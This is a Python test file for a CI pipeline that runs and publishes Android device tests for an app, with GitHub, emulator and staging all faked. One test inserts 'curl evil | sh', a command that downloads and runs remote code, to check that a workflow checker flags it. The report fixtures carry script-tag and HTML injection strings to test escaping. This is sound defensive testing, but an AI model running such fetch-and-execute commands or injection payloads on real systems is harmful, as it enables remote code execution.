"""May Playground device tests (device-tests.yml): gate.py --action device-tests, prepare.py on main's head,
device_tests.py and publish.py device-open / device-push. Everything Android, GitHub and staging is faked."""

import io
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
from unittest.mock import patch
import urllib.error

import device_tests
from device_tests import DeviceTestsError
import gate
from gate import GateDenial, validate_run
import prepare
from prepare import PrepareError, fetch
import publish
from publish import PublishError
import static_check
import store
from test_renders import png

REPO, MAIN, DISPATCH = "May-Assistant/may-releases", "refs/heads/main", "workflow_dispatch"
SHA = "a" * 40
RUN = "20261021-" + SHA[:12]
ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = ".github/workflows/device-tests.yml"
RECIPIENT = "age1" + "q" * 58
TOKEN = "session-token-" + "x" * 30
MP4 = b"\0\0\0\x18ftypmp42" + b"\0" * 32


class GateTests(unittest.TestCase):
    def test_dispatch_and_the_nightly_schedule_from_main_alone(self):
        self.assertEqual(validate_run(REPO, MAIN, DISPATCH, SHA, "device-tests"), "may-device-tests")
        self.assertEqual(validate_run(REPO, MAIN, "schedule", "main", "device-tests"), "may-device-tests")
        self.assertIn("device-tests", gate.NO_REVIEWER_ACTIONS)
        for repo, ref, event, sha, action in ((REPO, "refs/heads/x", "schedule", "main", "device-tests"),
                                              (REPO, MAIN, "push", SHA, "device-tests"),
                                              (REPO, MAIN, "schedule", SHA, "compile"),
                                              (REPO, MAIN, DISPATCH, "main", "compile"),
                                              (REPO, MAIN, DISPATCH, "HEAD", "device-tests")):
            with self.subTest(event=event, sha=sha, action=action), self.assertRaises(GateDenial):
                validate_run(repo, ref, event, sha, action)


class MainHeadTests(unittest.TestCase):
    def test_main_resolves_to_main_head_and_is_checked_out_exactly(self):
        with tempfile.TemporaryDirectory() as directory:
            private = Path(directory) / "may-private"
            private.mkdir()
            calls = []
            with patch("prepare.quiet", side_effect=lambda argv, log, env: calls.append(argv)), \
                    patch("prepare.git_status", return_value=0), patch("prepare.head_of", return_value=SHA):
                resolved = fetch(Path(directory) / "may-source", "git@example.invalid:x.git", "main", "fixture key",
                                 private, "app", main_history=True)
        self.assertEqual(resolved, SHA)
        self.assertIn(["git", "-C", str(Path(directory) / "may-source"), "-c", "advice.detachedHead=false", "checkout",
                       "--quiet", "--detach", SHA], calls)

    def test_main_is_refused_outside_main_history_and_unresolved_heads(self):
        with tempfile.TemporaryDirectory() as directory:
            private = Path(directory) / "may-private"
            private.mkdir()
            with patch("prepare.quiet"), patch("prepare.git_status", return_value=0), \
                    patch("prepare.head_of", return_value=SHA), self.assertRaises(PrepareError):
                fetch(Path(directory) / "a", "git@example.invalid:x.git", "main", "k", private, "app", pull="42")
            with patch("prepare.quiet"), patch("prepare.git_status", return_value=0), \
                    patch("prepare.head_of", return_value=""), self.assertRaises(PrepareError):
                fetch(Path(directory) / "b", "git@example.invalid:x.git", "main", "k", private, "app",
                      main_history=True)


class ScenarioTests(unittest.TestCase):
    def test_the_committed_list(self):
        ids = [row["id"] for row in device_tests.scenarios()]
        self.assertEqual(ids, ["sign-in", "connections"])
        self.assertEqual([row["id"] for row in device_tests.scenarios("connections")], ["connections"])
        with self.assertRaises(DeviceTestsError):
            device_tests.scenarios("sign-in,unknown")

    def test_malformed_rows_are_refused(self):
        good = device_tests.scenarios()[0]
        for change in ({"id": "Sign In"}, {"flow": "../x.yaml"}, {"driver": "shell"}, {"platforms": ["web"]},
                       {"outward": "no"}, {"server": [{"get": "https://elsewhere/v1/x", "expect": 200}]},
                       {"server": [{"get": "/v1/me", "expect": 500}]}):
            with self.subTest(change=change), tempfile.TemporaryDirectory() as directory:
                path = Path(directory) / "s.json"
                path.write_text(json.dumps([dict(good, **change)]))
                with patch("device_tests.SCENARIOS", path), self.assertRaises(DeviceTestsError):
                    device_tests.scenarios()


class FakeReply(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False


class MintTests(unittest.TestCase):
    def test_mints_with_the_secret_in_the_body_and_returns_only_a_token(self):
        seen = {}

        def post(request, timeout):
            seen.update(url=request.full_url, auth=request.headers.get("Authorization"), body=json.loads(request.data))
            return FakeReply(json.dumps({"token": TOKEN, "expires_at": "2026-10-21T06:00:00Z",
                                         "user_id": "u_1"}).encode())

        self.assertEqual(device_tests.mint("https://staging.example", "s" * 32, post), TOKEN)
        self.assertEqual(seen, {"url": "https://staging.example/v1/auth/test-session", "auth": None,
                                "body": {"secret": "s" * 32}})

    def test_a_bad_reply_is_refused(self):
        for reply in (b"not json", b"{}", json.dumps({"token": "short"}).encode()):
            with self.subTest(reply=reply), self.assertRaises(DeviceTestsError):
                device_tests.mint("https://staging.example", "s", lambda request, timeout: FakeReply(reply))

        def refused(request, timeout):
            raise urllib.error.HTTPError(request.full_url, 403, "no", {}, None)

        with self.assertRaises(DeviceTestsError):
            device_tests.mint("https://staging.example", "s", refused)

    def test_server_check_status(self):
        def refused(request, timeout):
            raise urllib.error.HTTPError(request.full_url, 401, "no", {}, None)

        self.assertEqual(device_tests.server_check("https://s.example", TOKEN, "/v1/me", lambda r, timeout: FakeReply(b"")), 200)
        self.assertEqual(device_tests.server_check("https://s.example", TOKEN, "/v1/me", refused), 401)


class FakeRecorder:
    def __init__(self, adb, env, scenario, log):
        self.scenario = scenario

    def start(self):
        pass

    def stop(self, folder):
        (folder / (self.scenario + ".mp4")).write_bytes(MP4)
        return [self.scenario + ".mp4"]


class RunTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        self.source, self.private = self.root / "may-source", self.root / "may-private"
        (self.source / "android/app/build/outputs/apk/playground/debug").mkdir(parents=True)
        (self.source / device_tests.APK).write_bytes(b"apk")
        (self.source / device_tests.FLOWS_DIR).mkdir(parents=True)
        (self.source / device_tests.FLOWS_DIR / "sign-in.yaml").write_text("appId: x\n")
        self.private.mkdir()
        self.env = {"RUNNER_TEMP": str(self.root), "MAY_TEST_SIGNIN_SECRET": "s" * 32,
                    "MAY_STAGING_API_URL": "https://staging.example", "PATH": "/usr/bin:/bin"}

    def tearDown(self):
        self.directory.cleanup()

    def run_it(self, env=None, selection="all", fail=(), status=200):
        calls = []
        shutil.rmtree(self.root / device_tests.OUT, ignore_errors=True)
        (self.private / device_tests.VERDICTS).unlink(missing_ok=True)

        class Process:
            def terminate(self):
                calls.append(["terminate"])

            def wait(self, timeout=None):
                return 0

        def private(argv, log, *, cwd=None, env=None, check=True, timeout=None):
            calls.append(list(argv))
            return 1 if argv[-1].endswith(".xml") and any(f"/{name}.xml" in argv[-1] for name in fail) else 0

        def screenshot(adb, env, path, log):
            path.write_bytes(png())
            return path.name

        environ = dict(self.env, **(env or {}))
        with patch.dict(os.environ, {k: v for k, v in environ.items() if v is not None}, clear=True), \
                patch("device_tests.boot", return_value=("/sdk/adb", Process(), {})), \
                patch("device_tests.maestro", return_value=Path("/fake/maestro")), \
                patch("device_tests.flows.run_private", side_effect=private), \
                patch("device_tests.flows.sdk", return_value=Path("/sdk")), \
                patch("device_tests.Recorder", FakeRecorder), patch("device_tests.screenshot", side_effect=screenshot), \
                patch("device_tests.head_revision", return_value=SHA), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            device_tests.run_scenarios(selection, minted=lambda base, secret: TOKEN,
                                       checked=lambda base, token, path: status)
            self.assertNotIn("MAY_TEST_SIGNIN_SECRET", os.environ)
        runs = list((self.root / device_tests.OUT).iterdir())
        report = json.loads((runs[0] / "android" / "report.json").read_text())
        return calls, report, out.getvalue(), runs[0]

    def test_signs_in_runs_each_flow_records_and_reports(self):
        calls, report, out, run = self.run_it()
        start = [argv for argv in calls if "am" in argv][0]
        self.assertEqual(start[-3:], ["--es", "may_test_session", TOKEN])
        self.assertEqual([row["id"] for row in report["scenarios"]], ["sign-in", "connections"])
        sign_in, connections = report["scenarios"]
        self.assertEqual((sign_in["verdict"], sign_in["videos"], sign_in["screenshots"]),
                         ("ui-pass", ["sign-in.mp4"], ["sign-in-end.png"]))
        self.assertEqual((connections["verdict"], connections["reason"]),
                         ("fail", "may-app has no Maestro flow for this scenario"))
        self.assertEqual(out.splitlines(), [
            "May device tests (android): sign-in: ui-pass", "May device tests (android): connections: fail",
            "May device tests (android): 0 passed, 1 passed on screen alone (server checks not configured), 1 failed, "
            "0 skipped"])
        self.assertNotIn(TOKEN, out)
        self.assertNotIn(TOKEN, (run / "android" / "report.json").read_text())
        self.assertRegex(run.name, r"^[0-9]{8}-" + SHA[:12] + "$")
        self.assertEqual(json.loads((self.private / device_tests.VERDICTS).read_text()), ["ui-pass", "fail"])
        self.assertIn(["terminate"], calls)

    def test_a_failing_flow_and_server_checks(self):
        (self.source / device_tests.FLOWS_DIR / "connections.yaml").write_text("appId: x\n")
        listed = json.loads(device_tests.SCENARIOS.read_text())
        listed[1]["server"] = [{"get": "/v1/connections", "expect": 200}]
        path = self.root / "scenarios.json"
        path.write_text(json.dumps(listed))
        with patch("device_tests.SCENARIOS", path):
            _, report, _, _ = self.run_it(fail=("sign-in",))
            self.assertEqual([row["verdict"] for row in report["scenarios"]], ["fail", "pass"])
            self.assertEqual(report["scenarios"][1]["server"], [{"get": "/v1/connections", "status": 200, "pass": True}])
            _, report, _, _ = self.run_it(status=500)
            self.assertEqual(report["scenarios"][1]["verdict"], "fail", "a failed server check fails the scenario")

    def test_outward_scenarios_are_skipped_when_switched_off(self):
        listed = json.loads(device_tests.SCENARIOS.read_text())
        listed[0]["outward"] = True
        path = self.root / "scenarios.json"
        path.write_text(json.dumps(listed))
        with patch("device_tests.SCENARIOS", path):
            _, report, _, _ = self.run_it(env={"MAY_DEVICE_TESTS_OUTWARD": "off"})
            self.assertEqual(report["scenarios"][0]["verdict"], "skipped")
            shutil.rmtree(self.root / device_tests.OUT)
            (self.private / device_tests.VERDICTS).unlink()
            _, report, _, _ = self.run_it()
            self.assertEqual(report["scenarios"][0]["verdict"], "ui-pass")

    def test_refusals_before_anything_runs(self):
        for env, message in (({"MAY_TEST_SIGNIN_SECRET": None}, "MAY_TEST_SIGNIN_SECRET is not set"),
                             ({"MAY_STAGING_API_URL": "http://staging.example"}, "MAY_STAGING_API_URL is not an https"),
                             ({"MAY_APP_READ_KEY": "x"}, "A secret for another release step")):
            with self.subTest(message=message):
                with self.assertRaises((DeviceTestsError, store.StoreError)) as refused:
                    self.run_it(env=env)
                self.assertIn(message, refused.exception.args[0])


class ToolTests(unittest.TestCase):
    def test_maestro_is_refused_unless_its_hash_matches(self):
        with tempfile.TemporaryDirectory() as directory:
            root, private = Path(directory), Path(directory) / "may-private"
            private.mkdir()

            def curl(argv, log, **kwargs):
                Path(argv[argv.index("-o") + 1]).write_bytes(b"not the pinned release")
                return 0

            with patch("device_tests.flows.run_private", side_effect=curl):
                try:
                    device_tests.maestro(root, private, private / "log")
                except DeviceTestsError as refused:
                    self.assertEqual(refused.args[0], "The Maestro download's hash differs; no scenario ran")
                except Exception as error:
                    self.fail("refused only by accident: " + type(error).__name__)
                else:
                    self.fail("an unpinned Maestro was accepted")
            self.assertFalse((root / "may-maestro").exists())

    def test_recordings_are_one_file_or_numbered_parts(self):
        with tempfile.TemporaryDirectory() as directory:
            folder, pulled = Path(directory), []

            def private(argv, log, **kwargs):
                pulled.append(argv)
                return 0

            recorder = device_tests.Recorder("/sdk/adb", {}, "chat", folder / "log")
            for parts, names in ((1, ["chat.mp4"]), (2, ["chat-part1.mp4", "chat-part2.mp4"])):
                recorder.parts = parts
                with patch("device_tests.flows.run_private", side_effect=private):
                    self.assertEqual(recorder.stop(folder), names)
            self.assertIn(["/sdk/adb", "shell", "pkill", "-2", "screenrecord"], pulled)


class SealVerdictTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        folder = self.root / device_tests.OUT / RUN / "android"
        folder.mkdir(parents=True)
        (folder / "report.json").write_text("{}")
        (folder / "sign-in.mp4").write_bytes(MP4)
        (self.root / "may-private").mkdir()

    def tearDown(self):
        self.directory.cleanup()

    def test_seal(self):
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            try:
                device_tests.seal()
            except DeviceTestsError as error:
                self.fail("an unset recipient is reported, not refused: " + error.args[0])
        self.assertIn("MAY_RENDERS_RECIPIENT is not set in may-device-tests; nothing was sealed", out.getvalue())
        seen = {}

        def age(argv, **kwargs):
            with tarfile.open(argv[-1]) as archive:
                seen["names"] = archive.getnames()
            Path(argv[argv.index("-o") + 1]).write_bytes(b"sealed")
            return subprocess.CompletedProcess(argv, 0)

        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_RENDERS_RECIPIENT": RECIPIENT}, clear=True), \
                patch("device_tests.toolchain.tool_path", return_value="/fake/age"), \
                patch("device_tests.subprocess.run", side_effect=age), patch("sys.stdout", new_callable=io.StringIO):
            device_tests.seal()
        self.assertEqual(seen["names"], [RUN, RUN + "/android", RUN + "/android/report.json", RUN + "/android/sign-in.mp4"])
        self.assertEqual(sorted(p.name for p in (self.root / device_tests.SEALED).iterdir()), ["android.age"])

    def test_verdict(self):
        verdicts = self.root / "may-private" / device_tests.VERDICTS
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), patch("sys.stdout", new_callable=io.StringIO):
            verdicts.write_text(json.dumps(["pass", "ui-pass", "skipped"]))
            device_tests.verdict()
            verdicts.write_text(json.dumps(["pass", "fail"]))
            with self.assertRaises(DeviceTestsError):
                device_tests.verdict()


def device_tar(entries):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w") as archive:
        for name, data in entries:
            info = tarfile.TarInfo(name)
            if data is None:
                info.type = tarfile.DIRTYPE
                archive.addfile(info)
            else:
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
    return stream.getvalue()


REPORT = {"run": RUN, "device": "android", "scenarios": [
    {"id": "sign-in", "title": "<script>x</script>", "verdict": "ui-pass", "reason": "server checks not configured",
     "videos": ["sign-in.mp4"], "screenshots": ["sign-in-end.png"], "server": [], "seconds": 40},
    {"id": "connections", "verdict": "fail", "videos": [], "screenshots": [],
     "server": [{"get": "/v1/connections", "status": 500, "pass": False}]}]}


class PublishDeviceTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        (self.root / publish.DEVICE_DOWNLOAD).mkdir()
        (self.root / publish.DEVICE_DOWNLOAD / "android.age").write_bytes(b"sealed")

    def tearDown(self):
        self.directory.cleanup()

    def open_with(self, entries):
        def decrypt(sealed, plain, identity, recipient, private):
            plain.write_bytes(device_tar(entries))

        key = "AGE-SECRET-KEY-1" + "Q" * 58
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_RENDERS_DECRYPT_KEY": key,
                                     "MAY_RENDERS_RECIPIENT": RECIPIENT, "GITHUB_RUN_ID": "9",
                                     "GITHUB_RUN_ATTEMPT": "2"}, clear=True), \
                patch("publish.decrypt", side_effect=decrypt), patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.open_device()
            self.assertNotIn("MAY_RENDERS_DECRYPT_KEY", os.environ)
        return self.root / publish.TREE / RUN, out.getvalue()

    GOOD = [(RUN, None), (RUN + "/android", None), (RUN + "/android/report.json", json.dumps(REPORT).encode()),
            (RUN + "/android/sign-in.mp4", MP4), (RUN + "/android/sign-in-end.png", png()),
            (RUN + "/android/sign-in.xml", b"<testsuites/>")]

    def test_the_report_is_checked_and_the_readme_built_here(self):
        tree, out = self.open_with(self.GOOD)
        self.assertEqual(out.strip(), f"May device tests decrypted and checked: run folder device-tests/{RUN}/ with 2 "
                                      "scenario reports from 1 devices")
        readme = (tree / "README.md").read_text()
        self.assertIn("## sign-in: Sign in with a staging test session", readme)
        self.assertIn("**android: ui-pass** (server checks not configured)", readme)
        self.assertIn('<img src="android/sign-in-end.png" width="300">', readme)
        self.assertIn("Recording: `sign-in.mp4`", readme)
        self.assertIn("encrypted artifact may-device-<device>-2 of "
                      "https://github.com/May-Assistant/may-releases/actions/runs/9, kept 7 days", readme)
        self.assertEqual(list(tree.rglob("*.mp4")), [], "recordings never enter may-renders history")
        self.assertIn("GET /v1/connections: 500", readme)
        self.assertNotIn("<script>", readme + (tree / "index.html").read_text())
        page = (tree / "index.html").read_text()
        self.assertIn("Recording: <code>sign-in.mp4</code>", page)
        self.assertIn("may-device-&lt;device&gt;-2", page)
        self.assertNotIn("<video", page)

    def test_anything_outside_the_layout_or_report_shape_is_refused(self):
        def report(**change):
            rows = [dict(REPORT["scenarios"][0], **change)]
            return (RUN + "/android/report.json", json.dumps(dict(REPORT, scenarios=rows)).encode())

        cases = {
            "other device folder": self.GOOD + [(RUN + "/ios", None)],
            "unknown file": self.GOOD + [(RUN + "/android/run.sh", b"x")],
            "not an mp4": self.GOOD[:3] + [(RUN + "/android/sign-in.mp4", b"not a video")] + self.GOOD[4:],
            "unknown scenario": self.GOOD[:2] + [report(id="elsewhere")] + self.GOOD[3:],
            "unknown verdict": self.GOOD[:2] + [report(verdict="great")] + self.GOOD[3:],
            "free-text reason": self.GOOD[:2] + [report(reason="<b>hi</b>")] + self.GOOD[3:],
            "missing video": self.GOOD[:2] + [report(videos=["other.mp4"])] + self.GOOD[3:],
            "bad run folder": [("main", None), ("main/android", None), ("main/android/report.json", b"{}")],
        }
        for label, entries in cases.items():
            with self.subTest(label=label):
                shutil.rmtree(self.root / publish.TREE, ignore_errors=True)
                try:
                    self.open_with(entries)
                except PublishError:
                    self.assertFalse((self.root / publish.TREE).exists())
                    continue
                self.fail(label + ": published")

    def test_push_goes_under_device_tests_and_keeps_its_own_runs(self):
        self.open_with(self.GOOD)
        calls, work = [], self.root / "may-publish-git"

        def git(argv, log, env, cwd, capture=False):
            calls.append(argv)
            if argv[0] == "init":
                Path(argv[-1]).mkdir()
            if argv[0] == "checkout":
                (work / "device-tests").mkdir()
                old = [{"folder": "202610%02d-%012x" % (n, n)} for n in range(1, 11)]
                (work / "device-tests" / "runs.json").write_text(json.dumps(old))
                for run in old:
                    (work / "device-tests" / run["folder"]).mkdir()
                (work / "runs.json").write_text(json.dumps([{"folder": "b" * 12}]))
            return b"abc\trefs/heads/main\n" if argv[0] == "ls-remote" else b""

        key = "-----BEGIN OPENSSH PRIVATE KEY-----\n" + "A" * 120 + "\n-----END OPENSSH PRIVATE KEY-----"
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_APP_RENDERS_WRITE_KEY": key,
                                     "GITHUB_RUN_ID": "9"}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.push_device(run_git=git)
        kept = json.loads((work / "device-tests" / "runs.json").read_text())
        self.assertEqual(kept[0], {"folder": RUN, "run": "9"})
        self.assertEqual(len(kept), 10)
        self.assertIn(["rm", "-r", "-q", "--ignore-unmatch", "--", "device-tests/20261010-00000000000a"], calls)
        self.assertEqual(json.loads((work / "runs.json").read_text()), [{"folder": "b" * 12}], "renders' list untouched")
        self.assertTrue((work / "device-tests" / RUN / "android" / "sign-in-end.png").is_file())
        self.assertFalse((work / "device-tests" / RUN / "android" / "sign-in.mp4").exists())
        self.assertEqual([argv for argv in calls if argv[0] == "push"], [["push", "--quiet", "origin", "HEAD:refs/heads/main"]])
        self.assertEqual(out.getvalue().strip(), f"May device tests published to may-renders as device-tests/{RUN}/ (10 run folders "
                                      "kept, 1 removed)")

    def test_nothing_sealed_publishes_nothing(self):
        (self.root / publish.DEVICE_DOWNLOAD / "android.age").unlink()
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.open_device()
            publish.push_device(run_git=lambda *a, **k: self.fail("git ran"))
        self.assertEqual(out.getvalue().splitlines(), [
            "May device tests: no sealed report from this run attempt; nothing will be published",
            "May device tests: nothing was decrypted, so nothing was pushed"])


class WorkflowPinTests(unittest.TestCase):
    def setUp(self):
        self.text = (ROOT / WORKFLOW).read_text()

    def flagged(self, text, message):
        problems = static_check.device_tests_workflow_problems(text)
        self.assertTrue(any(message in p for p in problems), problems)

    def test_the_committed_workflow_and_tool_pass(self):
        self.assertEqual(static_check.device_tests_workflow_problems(self.text), [])
        self.assertEqual(static_check.device_tests_print_problems(ROOT), [])

    def test_the_sign_in_secret_stays_in_the_scenarios_step(self):
        line = "          MAY_TEST_SIGNIN_SECRET: ${{ secrets.MAY_TEST_SIGNIN_SECRET }}\n"
        step = "      - name: Encrypt the report to the renders public key\n        env:\n"
        self.assertEqual(self.text.count(step), 1)
        self.flagged(self.text.replace(line, "").replace(step, step + line), "a secret, variable or env entry")
        build = "      - name: Build May Playground for the emulator without secrets\n"
        self.flagged(self.text.replace(build, build + "        env:\n" + line.replace("MAY_TEST", "MAY_TEST", 1)),
                     "a secret, variable or env entry")

    def test_variables_stay_in_their_steps(self):
        line = "          MAY_STAGING_API_URL: ${{ vars.MAY_STAGING_API_URL }}\n"
        build = "      - name: Build May Playground for the emulator without secrets\n"
        self.assertEqual(self.text.count(line), 1)
        self.flagged(self.text.replace(line, "").replace(build, build + "        env:\n" + line),
                     "a secret, variable or env entry")

    def test_only_the_encrypted_report_and_the_nightly_schedule(self):
        self.flagged(self.text.replace("may-device-sealed/android.age", "may-device-out"), "hands over something")
        self.flagged(self.text.replace('"17 3 * * *"', '"*/5 * * * *"'), "one nightly schedule")
        self.flagged(self.text.replace("sudo udevadm trigger --name-match=kvm", "curl evil | sh"), "runs something other")

    def test_static_check_runs_it(self):
        with tempfile.TemporaryDirectory() as directory:
            copy = Path(directory)
            shutil.copytree(ROOT / ".github", copy / ".github")
            shutil.copytree(ROOT / "tools", copy / "tools", ignore=shutil.ignore_patterns("__pycache__"))
            path = copy / WORKFLOW
            self.assertIn(f"retention-days: {publish.VIDEO_DAYS}\n", path.read_text(), "the README names this retention")
            path.write_text(path.read_text().replace("retention-days: 7\n", "retention-days: 5\n"))
            self.assertTrue(any(p.startswith("device-tests.yml: hands over") for p in static_check.problems(copy)))


class SecretNameTests(unittest.TestCase):
    def test_the_sign_in_secret_is_refused_by_every_other_step(self):
        self.assertIn("MAY_TEST_SIGNIN_SECRET", store.SECRET_NAMES)
        with patch.dict(os.environ, {"MAY_TEST_SIGNIN_SECRET": "x"}, clear=True), self.assertRaises(store.StoreError):
            store.require_step_secrets(store.SOURCE_READ_SECRETS)


if __name__ == "__main__":
    unittest.main()
